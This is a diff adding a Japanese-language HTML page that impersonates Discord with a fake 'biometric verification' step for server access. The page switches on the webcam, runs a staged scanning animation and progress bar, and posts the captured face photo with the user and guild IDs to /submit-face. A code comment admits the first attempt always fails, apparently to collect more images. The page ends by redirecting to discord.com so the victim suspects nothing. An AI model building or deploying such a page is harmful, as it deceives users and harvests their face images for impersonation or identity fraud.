@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord — 生体認証</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: "Noto Sans JP", sans-serif;
+    background: #313338;
+    color: #dbdee1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 16px;
+  }
+  .card {
+    background: #2b2d31;
+    border-radius: 8px;
+    padding: 32px 24px;
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+  }
+  .discord-logo {
+    width: 48px;
+    height: 48px;
+    background: #5865f2;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px;
+    font-size: 24px;
+  }
+  h1 { font-size: 20px; color: #f2f3f5; margin-bottom: 8px; }
+  .subtitle { color: #b5bac1; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+
+  .camera-wrap {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 4/3;
+    background: #1e1f22;
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 16px;
+  }
+  #video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transform: scaleX(-1);
+  }
+  .face-overlay {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 60%;
+    aspect-ratio: 1;
+    border: 3px solid rgba(88,101,242,0.7);
+    border-radius: 50%;
+    pointer-events: none;
+  }
+  .face-overlay.scanning {
+    animation: scan 1.5s ease-in-out infinite;
+  }
+  .face-overlay.error {
+    border-color: rgba(242,63,67,0.9);
+    animation: shake 0.4s ease;
+  }
+  .face-overlay.success {
+    border-color: rgba(87,242,135,0.9);
+  }
+  @keyframes scan {
+    0%,100% { box-shadow: 0 0 0 0 rgba(88,101,242,0.3); }
+    50%      { box-shadow: 0 0 0 12px rgba(88,101,242,0); }
+  }
+  @keyframes shake {
+    0%,100% { transform: translate(-50%,-50%); }
+    20%     { transform: translate(-48%,-50%); }
+    40%     { transform: translate(-52%,-50%); }
+    60%     { transform: translate(-48%,-50%); }
+    80%     { transform: translate(-52%,-50%); }
+  }
+
+  .scan-line {
+    position: absolute;
+    width: 100%; height: 2px;
+    background: linear-gradient(90deg, transparent, #5865f2, transparent);
+    animation: scanline 2s linear infinite;
+    display: none;
+  }
+  .scan-line.active { display: block; }
+  @keyframes scanline {
+    0%   { top: 0; }
+    100% { top: 100%; }
+  }
+
+  .status-msg {
+    font-size: 13px;
+    min-height: 20px;
+    margin-bottom: 16px;
+    color: #b5bac1;
+  }
+  .status-msg.error   { color: #f23f43; }
+  .status-msg.success { color: #57f287; }
+  .status-msg.info    { color: #7ecfff; }
+
+  .progress-wrap {
+    background: #1e1f22;
+    border-radius: 4px;
+    height: 6px;
+    margin-bottom: 20px;
+    overflow: hidden;
+    display: none;
+  }
+  .progress-wrap.active { display: block; }
+  .progress-bar {
+    height: 100%;
+    background: #5865f2;
+    width: 0%;
+    transition: width 0.1s;
+    border-radius: 4px;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.15s;
+  }
+  .btn-primary { background: #5865f2; color: #fff; }
+  .btn-primary:hover { background: #4752c4; }
+  .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .steps {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+  .step {
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    background: #3b3d44;
+    color: #b5bac1;
+    font-size: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+  }
+  .step.active  { background: #5865f2; color: #fff; }
+  .step.done    { background: #57f287; color: #000; }
+  .step-line {
+    width: 30px; height: 2px;
+    background: #3b3d44;
+    margin-top: 13px;
+  }
+
+  .tip {
+    background: #1e1f22;
+    border-radius: 6px;
+    padding: 10px 14px;
+    font-size: 12px;
+    color: #b5bac1;
+    text-align: left;
+    margin-bottom: 16px;
+    line-height: 1.6;
+  }
+  .tip li { margin-left: 16px; }
+
+  #canvas { display: none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="discord-logo">🛡️</div>
+  <h1>生体認証による本人確認</h1>
+  <p class="subtitle">
+    このサーバーへのアクセスには<br>
+    顔認証による本人確認が必要です
+  </p>
+
+  <!-- ステップ表示 -->
+  <div class="steps">
+    <div class="step active" id="step1">1</div>
+    <div class="step-line"></div>
+    <div class="step" id="step2">2</div>
+    <div class="step-line"></div>
+    <div class="step" id="step3">3</div>
+  </div>
+
+  <!-- カメラ -->
+  <div class="camera-wrap">
+    <video id="video" autoplay playsinline muted></video>
+    <div class="face-overlay" id="faceOverlay"></div>
+    <div class="scan-line" id="scanLine"></div>
+  </div>
+
+  <canvas id="canvas"></canvas>
+
+  <!-- ヒント -->
+  <div class="tip" id="tipBox">
+    <ul>
+      <li>顔全体が枠内に収まるようにしてください</li>
+      <li>明るい場所で撮影してください</li>
+      <li>マスクや眼鏡は外してください</li>
+    </ul>
+  </div>
+
+  <!-- プログレス -->
+  <div class="progress-wrap" id="progressWrap">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+
+  <!-- ステータス -->
+  <div class="status-msg" id="statusMsg">カメラを起動しています...</div>
+
+  <!-- ボタン -->
+  <button class="btn btn-primary" id="authBtn" disabled>
+    顔認証を開始する
+  </button>
+</div>
+
+<script>
+  // URLからstate取得 (user_id:guild_id)
+  const urlParams = new URLSearchParams(window.location.search);
+  const state     = urlParams.get("state") || "unknown:unknown";
+  const [userId, guildId] = state.split(":");
+
+  const video       = document.getElementById("video");
+  const canvas      = document.getElementById("canvas");
+  const overlay     = document.getElementById("faceOverlay");
+  const scanLine    = document.getElementById("scanLine");
+  const statusMsg   = document.getElementById("statusMsg");
+  const authBtn     = document.getElementById("authBtn");
+  const progressWrap= document.getElementById("progressWrap");
+  const progressBar = document.getElementById("progressBar");
+  const tipBox      = document.getElementById("tipBox");
+
+  let attempt = 0;
+  let stream  = null;
+
+  // カメラ起動
+  async function startCamera() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: 640, height: 480 },
+        audio: false,
+      });
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        setStatus("顔を枠内に合わせてボタンを押してください", "info");
+        authBtn.disabled = false;
+      };
+    } catch(e) {
+      setStatus("カメラへのアクセスが必要です。許可してください。", "error");
+    }
+  }
+
+  function setStatus(msg, type = "") {
+    statusMsg.textContent  = msg;
+    statusMsg.className    = "status-msg " + type;
+  }
+
+  function setStep(n) {
+    for (let i = 1; i <= 3; i++) {
+      const el = document.getElementById("step" + i);
+      if (i < n)       el.className = "step done";
+      else if (i === n) el.className = "step active";
+      else              el.className = "step";
+    }
+  }
+
+  // 写真撮影
+  function capturePhoto() {
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext("2d");
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+    return canvas.toDataURL("image/jpeg", 0.85);
+  }
+
+  // 認証処理
+  async function doAuth() {
+    authBtn.disabled = true;
+    attempt++;
+
+    setStep(2);
+    setStatus("顔を検出しています...", "info");
+    overlay.className = "face-overlay scanning";
+    scanLine.className = "scan-line active";
+    progressWrap.className = "progress-wrap active";
+    tipBox.style.display = "none";
+
+    // プログレスアニメ
+    let progress = 0;
+    const pInterval = setInterval(() => {
+      progress = Math.min(progress + Math.random() * 3, 85);
+      progressBar.style.width = progress + "%";
+    }, 100);
+
+    // 2秒スキャン演出
+    await new Promise(r => setTimeout(r, 2000));
+
+    // 写真撮影
+    const imageData = capturePhoto();
+
+    // プログレス完了
+    clearInterval(pInterval);
+    progressBar.style.width = "100%";
+    await new Promise(r => setTimeout(r, 300));
+
+    // サーバーに送信
+    try {
+      const resp = await fetch("/submit-face", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          image   : imageData,
+          user_id : userId,
+          guild_id: guildId,
+          attempt : attempt,
+        }),
+      });
+      const data = await resp.json();
+
+      scanLine.className   = "scan-line";
+      progressBar.style.width = "0%";
+      progressWrap.className  = "progress-wrap";
+
+      if (data.success) {
+        // 認証成功
+        setStep(3);
+        overlay.className = "face-overlay success";
+        setStatus("✅ 認証完了！Discordに戻ってください。", "success");
+        authBtn.textContent = "認証完了";
+        authBtn.style.background = "#57f287";
+        authBtn.style.color = "#000";
+
+        setTimeout(() => {
+          window.location.href = "https://discord.com";
+        }, 2000);
+
+      } else {
+        // 認証失敗 (1回目は必ず失敗)
+        overlay.className = "face-overlay error";
+        setStatus("❌ " + data.message, "error");
+        tipBox.style.display = "block";
+
+        setTimeout(() => {
+          overlay.className = "face-overlay";
+          authBtn.disabled  = false;
+          authBtn.textContent = "もう一度試す";
+          progressBar.style.width = "0%";
+        }, 1500);
+      }
+    } catch(e) {
+      overlay.className = "face-overlay error";
+      setStatus("通信エラーが発生しました。再試行してください。", "error");
+      authBtn.disabled = false;
+    }
+  }
+
+  authBtn.addEventListener("click", doAuth);
+  startCamera();
+</script>
+</body>
+</html>
